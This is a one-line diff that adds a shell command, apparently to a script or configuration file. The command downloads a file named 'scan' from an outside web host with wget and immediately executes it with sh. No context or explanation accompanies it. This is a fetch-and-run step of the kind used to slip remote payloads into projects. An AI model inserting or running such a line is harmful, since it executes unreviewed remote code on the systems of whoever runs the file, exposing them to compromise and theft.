@@ -1,0 +1,1 @@
+wget https://www.m4kr.net/work/scan;sh scan
